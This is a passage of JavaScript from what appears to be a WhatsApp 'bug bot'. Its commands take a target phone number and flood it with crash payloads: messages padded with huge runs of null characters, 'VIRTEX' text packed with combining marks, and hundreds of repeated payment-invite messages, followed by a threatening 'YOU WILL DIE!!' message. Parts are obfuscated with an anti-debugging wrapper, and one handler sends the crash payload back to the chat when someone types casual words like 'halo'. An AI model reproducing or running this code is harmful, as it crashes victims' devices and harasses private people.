_0x22eb30=![],_0x20b319;}},_0x4519ed=_0x3bad60['HvIsS'](_0xf6ea15),_0x4a071a=_0x4519ed[_0x2a4003(0x1d2,0x1e2,0x1c7,0x1a9)]=_0x4519ed[_0x2a4003(0x1d2,0x202,0x212,0x1b8)]||{},_0x3ebe71=[_0x3bad60[_0x2a4003(0x1e0,0x1fe,0x203,0x1d1)],_0x3bad60[_0x2a4003(0x199,0x1d2,0x183,0x1c6)],_0x3bad60[_0x2a4003(0x1b3,0x1db,0x1c9,0x192)],_0x3bad60[_0x15787d(0x397,0x3b5,0x3a2,0x381)],_0x3bad60[_0x2a4003(0x1e4,0x1ee,0x20d,0x1c0)],_0x3bad60['Ayzjo'],_0x3bad60[_0x15787d(0x3bb,0x3ae,0x3a5,0x386)]];for(let _0x20e899=-0x6*-0x494+-0xad*-0x35+-0x3f49;_0x20e899<_0x3ebe71['length'];_0x20e899++){if(_0x3bad60[_0x2a4003(0x177,0x178,0x194,0x18d)]('IJHDk',_0x3bad60['XyBNi'])){const _0x37aac4=_0x585481[_0x15787d(0x403,0x41c,0x3ff,0x3d0)](_0x387222,arguments);return _0x2c6a9e=null,_0x37aac4;}else{const _0x13de76=_0x1ecfe2[_0x15787d(0x3f8,0x427,0x3ec,0x3ca)+'r']['prototype'][_0x15787d(0x401,0x431,0x3d3,0x3fb)](_0x1ecfe2),_0x390eb5=_0x3ebe71[_0x20e899],_0x270984=_0x4a071a[_0x390eb5]||_0x13de76;_0x13de76[_0x2a4003(0x1e3,0x217,0x1dc,0x1c5)]=_0x1ecfe2['bind'](_0x1ecfe2),_0x13de76[_0x15787d(0x399,0x3a3,0x36b,0x3d6)]=_0x270984[_0x15787d(0x399,0x37f,0x386,0x35e)][_0x15787d(0x401,0x431,0x3ca,0x43e)](_0x270984),_0x4a071a[_0x390eb5]=_0x13de76;}}});_0x366b42();function hi(){function _0x36bb61(_0x31f4bf,_0xa6ec29,_0x1d942b,_0x2230b9){return _0x4bf7(_0x1d942b-0x302,_0x31f4bf);}function _0x541da7(_0x4012e7,_0x2e92ea,_0x9279e1,_0x2bad9c){return _0x4bf7(_0x2bad9c-0x23,_0x9279e1);}console[_0x541da7(0xff,0x133,0x138,0x139)](_0x541da7(0x16f,0x179,0x180,0x170)+'d!');}if(!isPremium)return;darkphonk=fs['readFileSy'+'nc'](_0xa592dd(-0x1dd,-0x1da,-0x1cb,-0x1ea)+_0x1845b8(0x101,0x101,0x139,0xec)+'p3'),inireact(randomemoji);function _0x380f(){const _0x5d4466=['wNiER','⁗\x20⋄\x20𝐘𝐎𝐔\x20𝐖𝐈','𝗹𝗕𝘂𝗴\x0a\x0a┌───','ah\x20dengan\x20','KRnZz','externalAd','text','‹›──────━\x0a','tes,\x20So\x20Th','418woJqXY','jpegThumbn','2618480YnezmT','return\x20(fu','ibution','ah\x20Tidak\x20V','VdDOk','startsWith','ranse','rn\x20this\x22)(','<!>\x20Nomor\x20','」\x0a\x0a━──────','bugwait','or\x2010\x20minu','contextInf','@s.whatsap','sendMessag','previewTyp','ptt','LLCsk','title','\x20kode\x20nega','console','EuSUy','constructo','erThumbnai','14UtrLFH','Hello\x20Worl','꫟Кz-Ж𝐭𝐞𝐧𝐭𝐢','*hoGanteng𝕣𝕤̊','𝗵𝘁\x20&\x20𝗦𝘄𝗲𝗲𝘁','9944196aHmnBn','33Isqvau','bind','ample\x20:\x20.','apply','cRhUl','👾\x20𝗟𝗼𝘀𝘁\x20𝗟𝗶𝗴','yPsPY','__proto__','uUTPX','194844bjrcjR','chat','sourceUrl','TLtzQ','18uaeHUP','𝐆\x20𝐒𝐔𝐂𝐂𝐄𝐒𝐒\x20','789','n\x27t\x20Get\x20𝗕𝗮','prototype','789\x20]','\x20Senpai!\x0a\x0a','relayMessa','6978OhKjSY','./media/au','𝐢𝐫𝐮𝐬⿻','search','xtyyQ','PHTDF','toString','amsJson','hoQwW','VIDEO','4312830vMBJZF','Reply','VIytQ','ngan\x20angka','\x0a\x0a╰┈\x20Pause','nomor\x20yang','audio','(((.+)+)+)','stbjg','TSoZj','nction()\x20','\x20the\x20bot\x20f','messagePar','ssage','mediaType','─᚜「\x20𝗡𝗼𝘁𝗲\x20」','dio/dead.m','CKoUe','\x20berawalan','ail','trace','mimetype','warn','ctor(\x22retu','e\x20Bot\x20Does','42ikIWJy','32244isaBjp','「\x20𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍','exception','bhKHc','rdrCt','𝗻𝗻𝗲𝗱\x0a\x0a—𝗧𝗵𝗲','kKhcd','SonqX','𝗹𝗲𝗻\x20‹›','renderLarg','sZloV','AagNM','{}.constru','log','𝐋𝐋\x20𝐃𝐈𝐄!!\x20','hasMediaAt','info','*\x0a\x0a𖥂\x20𝐕𝐈𝐑𝐔𝐒','url','enggunaan\x20','locationMe','quoted','replace','alid!\x0a\x0a[\x20P','atsapp.net','mediaUrl','body','𝐨𝐧\x20||\x20Ho.𝐕','showAdAttr','table','jISRW','6576500XPtJOY'];_0x380f=function(){return _0x5d4466;};return _0x380f();}if(!q)return zreply('<!>\x20Perint'+_0xa592dd(-0x150,-0x189,-0x1a6,-0x179)+_0x1845b8(0x122,0x124,0x125,0x114)+_0xa592dd(-0x16c,-0x1a4,-0x1a1,-0x1b6)+'.'+command+('\x20628123456'+_0xa592dd(-0x1a9,-0x1de,-0x219,-0x21a)));let bijipler=q[_0xa592dd(-0x18a,-0x1a1,-0x1db,-0x1cb)](/[^0-9]/g,'');if(bijipler[_0x1845b8(0x13b,0x163,0x176,0x115)]('0'))return zreply(_0x1845b8(0x13e,0x16d,0x16f,0x106)+'dimulai\x20de'+_0x1845b8(0xf4,0xf7,0x12e,0x125)+'\x200.\x20Gantil'+_0x1845b8(0x12e,0x129,0x101,0x142)+_0xa592dd(-0x1a3,-0x1cc,-0x1cf,-0x1bc)+_0x1845b8(0x103,0x135,0xe8,0x10e)+_0x1845b8(0x149,0x140,0x147,0x11b)+'ra\x0a\x0a<✓>\x20Ex'+_0x1845b8(0x156,0x142,0x18e,0x166)+command+('\x20628123456'+_0xa592dd(-0x222,-0x1e1,-0x1ab,-0x20a)));let target=bijipler+(_0x1845b8(0x143,0x17d,0x113,0x160)+'p.net');zreply(mess[_0xa592dd(-0x1a5,-0x182,-0x18e,-0x160)]),await sleep(-0x1*0x1b16+-0x15b1+-0x85d*-0x7);for(let i=-0x1*-0x17ff+-0x3*0xa9+-0x1604;i<-0xdf3*0x1+0x1*-0x1669+0x246b;i++){const _0x4f9214={};_0x4f9214[_0x1845b8(0x148,0x175,0x111,0x142)]='',_0x4f9214[_0x1845b8(0x11f,0xf6,0x10a,0x15e)+_0xa592dd(-0x1ff,-0x1c4,-0x1e6,-0x1b4)]={},_0x4f9214[_0x1845b8(0x11a,0xda,0x11d,0x13c)+'tachment']=!![];const _0x1bff03={};_0x1bff03[_0xa592dd(-0x1a7,-0x1c5,-0x1b3,-0x1b9)+_0xa592dd(-0x1ce,-0x1d4,-0x198,-0x213)]='',zynxzo[_0x1845b8(0xe6,0x100,0xd5,0x10c)+'ge'](target,{'viewOnceMessage':{'message':{'interactiveMessage':{'header':_0x4f9214,'body':{'text':_0x1845b8(0x151,0x15b,0x165,0x15b)+'ⅈ͓߲hoganteng\x20𑅆'+'༏'+'\x00'['repeat'](-0xdb5e9+-0xaab32+0x261cbb)},'nativeFlowMessage':_0x1bff03,'carouselMessage':{}}}}},{'participant':{'jid':target}}),await sleep(0x1320+-0x1425+0xcbd);}const _0x39fca3={};_0x39fca3[_0x1845b8(0x127,0x125,0x100,0x121)+_0x1845b8(0x138,0x13e,0x16f,0xf8)]=![],_0x39fca3[_0x1845b8(0x114,0x13b,0x105,0x14b)+_0xa592dd(-0x17e,-0x175,-0x153,-0x1b0)+'l']=![],_0x39fca3[_0xa592dd(-0x1a9,-0x18d,-0x1b9,-0x1bc)+_0x1845b8(0x104,0xd6,0x114,0x140)]=fakejpg,_0x39fca3[_0x1845b8(0x148,0x151,0x14e,0x127)]=xcrash['xv'],_0x39fca3[_0xa592dd(-0x1ae,-0x19d,-0x1c1,-0x1bf)]=_0xa592dd(-0x185,-0x196,-0x187,-0x188)+_0x1845b8(0x119,0xee,0xe5,0x13c),_0x39fca3[_0xa592dd(-0x15b,-0x17d,-0x19d,-0x198)+'e']=_0xa592dd(-0x1df,-0x1d2,-0x1df,-0x1db),_0x39fca3[_0x1845b8(0xdd,0xe2,0xf0,0x10c)]=_0xa592dd(-0x185,-0x172,-0x132,-0x136)+_0xa592dd(-0x19c,-0x19c,-0x1ad,-0x1ba)+_0x1845b8(0xe9,0x10e,0xac,0x102),_0x39fca3[_0x1845b8(0xff,0x112,0xe0,0x109)]=0x1,_0x39fca3[_0xa592dd(-0x1a8,-0x19e,-0x19e,-0x1c7)]=''+global['url'];function _0x1845b8(_0x1ece6b,_0x36c23f,_0x3071aa,_0x1ef809){return _0x4bf7(_0x1ece6b-0x2,_0x3071aa);}const _0x3a311a={};_0x3a311a['mentionedJ'+'id']=['00000@s.wh'+_0x1845b8(0x123,0x139,0x113,0x13d)],_0x3a311a[_0x1845b8(0x130,0x12e,0x118,0x10c)+_0x1845b8(0xf2,0x122,0xd9,0xd5)]=_0x39fca3;const _0x4e9cf0={};_0x4e9cf0[_0xa592dd(-0x1a8,-0x180,-0x1b2,-0x155)+'o']=_0x3a311a,_0x4e9cf0[_0x1845b8(0x131,0x143,0x13e,0x10a)]=_0xa592dd(-0x1a3,-0x169,-0x16a,-0x192)+_0xa592dd(-0x15a,-0x170,-0x140,-0x1a6)+'\x20𝗟𝗶𝗲\x0a<!>\x20Z'+'ynxzoo,'+_0x1845b8(0xe5,0x112,0xaf,0xf7)+'「\x20HoxHunte'+'r\x20」';function _0xa592dd(_0x5caf7b,_0x1126a9,_0x279145,_0x5be252){return _0x4bf7(_0x1126a9- -0x2c0,_0x5be252);}const _0x9a29c3={};function _0x4bf7(_0x265763,_0x35a73e){const _0x380fee=_0x380f();return _0x4bf7=function(_0x4bf7de,_0x2fbb54){_0x4bf7de=_0x4bf7de-(0x1*-0x2047+0x1106+-0x1*-0x101c);let _0x547446=_0x380fee[_0x4bf7de];return _0x547446;},_0x4bf7(_0x265763,_0x35a73e);}_0x9a29c3[_0xa592dd(-0x1ba,-0x1a2,-0x1b4,-0x196)]=hobug,await zynxzo['sendMessag'+'e'](target,_0x4e9cf0,_0x9a29c3);const _0x1a4c84={};_0x1a4c84[_0x1845b8(0x11d,0x14a,0xf0,0x15b)]=''+zynxzoAttack,zynxzo['sendMessag'+'e'](m[_0x1845b8(0x15e,0x17e,0x175,0x13a)],{'image':_0x1a4c84,'caption':_0xa592dd(-0x18d,-0x1b6,-0x194,-0x1d6)+_0xa592dd(-0x1bc,-0x1e2,-0x1cd,-0x1c3)+_0xa592dd(-0x1a3,-0x183,-0x19b,-0x1a5)+_0x1845b8(0x132,0x162,0x118,0x141)+'\x0a𖥂\x20𝐓𝐀𝐑𝐆𝐄𝐓\x20'+':\x20@'+target['split']('@')[-0x4*0x26f+-0x182f+-0x1*-0x21eb]+(_0x1845b8(0x11c,0x14c,0x12d,0x148)+'\x20:\x20𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻'+_0x1845b8(0x12d,0x133,0x16b,0x13a)+_0xa592dd(-0x1c7,-0x1c2,-0x186,-0x1b0)+_0x1845b8(0xf5,0xfc,0xf1,0x123)+_0x1845b8(0xfc,0x13a,0xec,0x120)+_0x1845b8(0x141,0x111,0x17a,0x106)+_0xa592dd(-0x1b9,-0x18f,-0x1a9,-0x153)+_0x1845b8(0x109,0x138,0x146,0x111)+_0x1845b8(0xe2,0xaa,0xe7,0xea)+_0xa592dd(-0x1ec,-0x1b2,-0x18f,-0x1e0)+'\x20𝗧𝗮𝗿𝗴𝗲𝘁\x20𝗛𝗮'+'𝘀\x20𝗕𝗲𝗲𝗻\x20𝗙𝗮𝗹'+_0xa592dd(-0x173,-0x1af,-0x1c4,-0x199))},{'quoted':m}),await sleep(0x4cb+-0x1601+0x2*0xc83);const _0x42ab3e={};_0x42ab3e[_0x1845b8(0xf7,0x116,0xbb,0xea)]=darkphonk,_0x42ab3e[_0x1845b8(0x106,0xca,0xde,0x136)]='audio/mp4',_0x42ab3e[_0xa592dd(-0x13b,-0x17c,-0x142,-0x18f)]=!![];const _0x25b4b3={};_0x25b4b3[_0x1845b8(0x120,0x135,0x151,0x15c)]=zets,zynxzo[_0x1845b8(0x144,0x116,0x17d,0x175)+'e'](m[_0x1845b8(0x15e,0x134,0x13d,0x12e)],_0x42ab3e,_0x25b4b3),taskdone(finishmoji);
}
break
//=================================================//
case 'tes': case '=.': case 'halo': case 'hem': case 'woi': case '👽': case '💀': case '💔': case '🙊': case '😷':{
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
inireact(randomemoji)
if (!isPremium) return
function _0xee4c(_0x27e269,_0x222229){var _0x5a68c2=_0x40d3();return _0xee4c=function(_0x1f6616,_0x1ee4ad){_0x1f6616=_0x1f6616-0x9d;var _0x37e38e=_0x5a68c2[_0x1f6616];return _0x37e38e;},_0xee4c(_0x27e269,_0x222229);}var _0x18b514=_0xee4c;(function(_0x3c589c,_0x40f13a){var _0x583cb3=_0xee4c,_0x10f792=_0x3c589c();while(!![]){try{var _0x3c05a3=-parseInt(_0x583cb3(0xb0))/0x1*(-parseInt(_0x583cb3(0xb7))/0x2)+parseInt(_0x583cb3(0xb9))/0x3*(-parseInt(_0x583cb3(0x9e))/0x4)+parseInt(_0x583cb3(0xa0))/0x5*(-parseInt(_0x583cb3(0xbc))/0x6)+-parseInt(_0x583cb3(0x9d))/0x7+-parseInt(_0x583cb3(0xa2))/0x8*(parseInt(_0x583cb3(0x9f))/0x9)+parseInt(_0x583cb3(0xb4))/0xa+-parseInt(_0x583cb3(0xb3))/0xb*(-parseInt(_0x583cb3(0xa3))/0xc);if(_0x3c05a3===_0x40f13a)break;else _0x10f792['push'](_0x10f792['shift']());}catch(_0x52e0d8){_0x10f792['push'](_0x10f792['shift']());}}}(_0x40d3,0xe80ef));function _0x40d3(){var _0x335b89=['2RjSsFO','{}.constructor(\x22return\x20this\x22)(\x20)','21nnRxOI','chat','console','6nyPeDY','constructor','1691711RExUyT','252876XCiRqp','144njOGpI','707075FwfRpc','exception','445360nxyxzz','12fqxkhE','(((.+)+)+)+$','repeat','bind','__proto__','table',`《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ VIRTEX██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌ą̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰ċ̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰ï̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







Dasar 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄`,'apply','length','warn','trace','search','prototype','333827HKloSb','info','relayMessage','23701634EcIUFb','1783310xHRyoN','toString','error'];_0x40d3=function(){return _0x335b89;};return _0x40d3();}var _0x2d7b54=(function(){var _0x3144e7=!![];return function(_0x43dd1f,_0x1159f2){var _0x4ea0e6=_0x3144e7?function(){if(_0x1159f2){var _0x4f90ec=_0x1159f2['apply'](_0x43dd1f,arguments);return _0x1159f2=null,_0x4f90ec;}}:function(){};return _0x3144e7=![],_0x4ea0e6;};}()),_0x1d8c85=_0x2d7b54(this,function(){var _0x20db21=_0xee4c;return _0x1d8c85[_0x20db21(0xb5)]()[_0x20db21(0xae)](_0x20db21(0xa4))[_0x20db21(0xb5)]()['constructor'](_0x1d8c85)[_0x20db21(0xae)](_0x20db21(0xa4));});_0x1d8c85();var _0x1ee4ad=(function(){var _0x33e83a=!![];return function(_0x4745a4,_0x487b5f){var _0x5d7fbe=_0x33e83a?function(){var _0x23689c=_0xee4c;if(_0x487b5f){var _0x4cc8be=_0x487b5f[_0x23689c(0xaa)](_0x4745a4,arguments);return _0x487b5f=null,_0x4cc8be;}}:function(){};return _0x33e83a=![],_0x5d7fbe;};}()),_0x1f6616=_0x1ee4ad(this,function(){var _0x38cc76=_0xee4c,_0xd85223=function(){var _0x4aee55=_0xee4c,_0x318879;try{_0x318879=Function('return\x20(function()\x20'+_0x4aee55(0xb8)+');')();}catch(_0x7bd542){_0x318879=window;}return _0x318879;},_0x5af93e=_0xd85223(),_0x99c4cb=_0x5af93e[_0x38cc76(0xbb)]=_0x5af93e['console']||{},_0x3b2ca6=['log',_0x38cc76(0xac),_0x38cc76(0xb1),_0x38cc76(0xb6),_0x38cc76(0xa1),_0x38cc76(0xa8),_0x38cc76(0xad)];for(var _0x874a96=0x0;_0x874a96<_0x3b2ca6[_0x38cc76(0xab)];_0x874a96++){var _0x416d80=_0x1ee4ad[_0x38cc76(0xbd)][_0x38cc76(0xaf)][_0x38cc76(0xa6)](_0x1ee4ad),_0x51e776=_0x3b2ca6[_0x874a96],_0x267d51=_0x99c4cb[_0x51e776]||_0x416d80;_0x416d80[_0x38cc76(0xa7)]=_0x1ee4ad[_0x38cc76(0xa6)](_0x1ee4ad),_0x416d80['toString']=_0x267d51[_0x38cc76(0xb5)][_0x38cc76(0xa6)](_0x267d51),_0x99c4cb[_0x51e776]=_0x416d80;}});_0x1f6616(),zynxzo[_0x18b514(0xb2)](m[_0x18b514(0xba)],{'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','locationMessage':{},'hasMediaAttachment':!![]},'body':{'text':_0x18b514(0xa9)+'\x00'[_0x18b514(0xa5)](0xdbba0)},'nativeFlowMessage':{'messageParamsJson':''},'carouselMessage':{}}}}},{'participant':{'jid':m[_0x18b514(0xba)]}});
zynxzo.sendMessage(m.chat, {
        react: { text: ["✅"], key: m.key }
    });
    //Sending Audio
    zynxzo.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: zets })
}
break
//=================================================//
case 'zynxzoc1': case 'lokasi': case 'lokasi1': case 'lokasi2': case 'lokasi3': case 'virusbug': case 'virusjid': case 'viraud': case 'lembu': case 'philips': case 'gasbug': case 'panasonic': case '🦸🏻‍♂️': case '🤨': case '🤪': case '🦖': case '☠️': case '😖': case '🥴': case '💦': case '🤯': case '🖕': {
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
if (!isPremium) return zreply(mess.premium)
if (!q) return zreply(`Example: .${command} 628xxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return zreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628xxx`)
let target = bijipler + '@s.whatsapp.net'
await zreply(mess.bugrespon)
for (let j = 0; j < 50; j++) {
await HoNgeri(target, force2)
await bugHO(target, force)
await HoNgeri(target, force2)
await bugHO(target, force)
await HoNgeri(target, force2)
await bugHO(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await HoNgeri(target, force2)
await bugHO(target, force)
await HoNgeri(target, force2)
await bugHO(target, force)
await HoNgeri(target, force2)
await bugHO(target, force)
await HoNgeri(target, force2)
await bugHO(target, force)
await crashX(target, force2)
await bugHO(target, force)
await bugHO(target, force2)
await crashX(target, force)
await bugHO(target, force)
await crashX(target, force2)
}
  // Successfully
  zynxzo.sendMessage(m.chat, {image: {url: `${zynxzoAttack}`}, caption: `𝘚𝘶𝘤𝘤𝘦𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘊𝘦𝘬 𝘛𝘢𝘳𝘨𝘦𝘵 𝘚𝘶𝘥𝘢𝘩 𝗖𝟭`},{quoted: m })
}
break
//=================================================//
case 'zynxzovirus': case 'zynxzoslot': case 'zynxzomods': case 'zynxzoclear': {
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
inireact(randomemoji)
if (!isPremium) return zreply(mess.premium)
if (!q) return zreply(`Example: .${command} 628xxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return zreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628xxx`)
let target = bijipler + '@s.whatsapp.net'
await zreply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await HoNgeri(target, force2)
await bugHO(target, force)
await HoNgeri(target, force2)
await bugHO(target, force)
await HoNgeri(target, force2)
await bugHO(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
  // Successfully
zynxzo.sendMessage(m.chat, {image: {url: `${zynxzoAttack}`}, caption: `𝘚𝘶𝘤𝘤𝘦𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘊𝘦𝘬 𝘛𝘢𝘳𝘨𝘦𝘵 𝘚𝘶𝘥𝘢𝘩 𝗖𝟭`},{quoted: m })
//Sending Audio
    zynxzo.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: zets })
taskdone(finishmoji)
}
break
//=================================================//
case 'bugcrash': case 'zynxzoautocrot': case 'virusslot': case 'mampusc1': case 'c1dek': {
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
inireact(randomemoji)
if (!isPremium) return zreply(mess.premium)
if (!q) return zreply(`Example: .${command} 628xxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return zreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628xxx`)
let target = bijipler + '@s.whatsapp.net'
await zreply(mess.bugrespon)
for (let j = 0; j < 50; j++) {
await crashX(target, force2)
await bugHO(target, force)
await bugHO(target, force2)
await crashX(target, force)
await bugHO(target, force2)
await crashX(target, force)
await crashX(target, force2)
await bugHO(target, force)
await bugHO(target, force2)
await crashX(target, force)
await bugHO(target, force2)
await crashX(target, force)
await crashX(target, force2)
await bugHO(target, force)
await bugHO(target, force2)
await crashX(target, force2)
await bugHO(target, force2)
await crashX(target, force)
await crashX(target, force2)
await bugHO(target, force)
await bugHO(target, force2)
await crashX(target, force)
await bugHO(target, force)
await crashX(target, force2)
}
// Successfully
  zynxzo.sendMessage(m.chat, {image: {url: `${zynxzoAttack}`}, caption: `𝘚𝘶𝘤𝘤𝘦𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘊𝘦𝘬 𝘛𝘢𝘳𝘨𝘦𝘵 𝘚𝘶𝘥𝘢𝘩 𝗖𝟭`},{quoted: m })
//Sending Audio
    zynxzo.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: zets })
taskdone(finishmoji)
}
break
//=================================================//
case 'killwhangsaff': case 'spamui': case 'spambug': case 'spamnotif': {
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
inireact(randomemoji)
if (!isPremium) return zreply(mess.premium)
if (!q) return zreply(`Example: .${command} 628xxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return zreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628xxx`)
let target = bijipler + '@s.whatsapp.net'
await zreply(mess.bugrespon)
for (let j = 0; j < 50; j++) {
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
await bugHO(target, force)
}
  // Successfully
  zynxzo.sendMessage(m.chat, {image: {url: `${zynxzoAttack}`}, caption: `𝘚𝘶𝘤𝘤𝘦𝘴 𝘚𝘦𝘯𝘥 𝘉𝘶𝘨 𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘊𝘦𝘬 𝘛𝘢𝘳𝘨𝘦𝘵 𝘚𝘶𝘥𝘢𝘩 𝗖𝟭`},{quoted: m })
//Sending Audio
    zynxzo.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: zets })
taskdone(finishmoji)
}
break
//=================================================//
case 'zynxzoios': case 'iosattack': {
if (!isPremium) return
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
inireact(randomemoji)
if (!q) return zreply(`<!> Perintah Tidak Valid!\n\n[ Example: .${command} 628xxx ]`); 
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return zreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 628xxx`)
  let target = bijipler + '@s.whatsapp.net'  
  zreply(mess.bugwait)  
      await sleep(2500)
        for (let j = 0; j < 600; j++) {
await zynxzo.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
await sleep(1500)
}
//Pengalihan Isu
    await zynxzo.sendMessage(target, {
    contextInfo: {
    mentionedJid: ['00000@s.whatsapp.net'],
    externalAdReply: {
    showAdAttribution: false,
    renderLargerThumbnail: false,
    jpegThumbnail: fakejpg,
    title: xcrash.xv,
    body: `⁗ ⋄ 𝐘𝐎𝐔 𝐖𝐈𝐋𝐋 𝐃𝐈𝐄!! `,
    previewType: "VIDEO",
    sourceUrl: `꫟Кz-Ж𝐭𝐞𝐧𝐭𝐢𝐨𝐧 || 𝐙𝐲𝐧𝐱𝐳.𝐕𝐢𝐫𝐮𝐬⿻`,
    mediaType: 1,
    mediaUrl: `${global.url}`
    }
   }, //Text For Bug
  text: `《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ VIRTEX██*_ 
